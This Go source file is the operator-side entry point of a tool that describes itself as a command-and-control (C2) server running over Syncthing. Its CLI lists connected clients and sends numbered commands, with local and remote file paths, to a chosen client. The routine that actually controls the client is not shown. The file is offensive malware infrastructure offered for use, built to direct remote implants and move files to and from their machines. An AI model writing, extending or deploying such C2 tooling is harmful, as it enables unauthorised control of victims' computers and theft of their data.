package main

import (
	"encoding/gob"
	"errors"
	"fmt"
	"os"
	"gitlab.torproject.org/acheong08/syndicate/lib"
	"gitlab.torproject.org/acheong08/syndicate/lib/commands"

	"github.com/leaanthony/clir"
)

var (
	// clientIndex is always +1 of the actual index as 0 means broadcast
	clientIndex int
	command     uint
	localPath   string
	remotePath  string
)

func main() {
	cli := clir.NewCli("syndicate", "A C2 server over syncthing", "v0.0.1")
	listCmd := cli.NewSubCommand("list", "List all clients")
	listCmd.Action(func() error {
		clientList := getClientList()
		for i, client := range clientList {
			fmt.Printf("%d: %s\n", i+1, client.String())
		}
		return nil
	})

	tuiCmd := cli.NewSubCommand("tui", "Start the TUI")
	tuiCmd.IntFlag("client", "The client index to interact with", &clientIndex)
	tuiCmd.UintFlag("command", "The command to run", &command)
	tuiCmd.StringFlag("path-local", "The local file to read/write", &localPath)
	tuiCmd.StringFlag("path-remote", "The remote file to read/write", &remotePath)
	tuiCmd.Action(func() error {
		var err bool
		if command == 0 || command >= uint(commands.NoOp) {
			fmt.Printf("Invalid command. Available commands are:\n")
			for _, cmd := range commands.CommandList() {
				fmt.Printf("%d: %s\n", cmd, cmd.String())
			}
			err = true
		}
		clientList := getClientList()
		// TODO: Support broadcast to all clients
		if clientIndex == 0 || clientIndex > len(clientList) {
			fmt.Println("Invalid client index. Clients:")
			for i, client := range clientList {
				fmt.Printf("%d: %s\n", i+1, client.String())
			}
			err = true
		}
		if err {
			return errors.New("invalid flags")
		}
		client := clientList[clientIndex-1]
		fail := controlClient(client, commands.Command(command), "UK")
		if fail != nil {
			panic(fail)
		}
		return fail
	})

	cli.Run()
}

func getClientList() lib.ClientList {
	var clientList lib.ClientList
	configDir, err := os.UserConfigDir()
	if err != nil {
		panic(err)
	}
	configDir += "/syndicate"
	file, err := os.Open(configDir + "/clients.bin")
	defer file.Close()
	if err != nil {
		return clientList
	}
	decoder := gob.NewDecoder(file)
	decoder.Decode(&clientList)
	return clientList
}
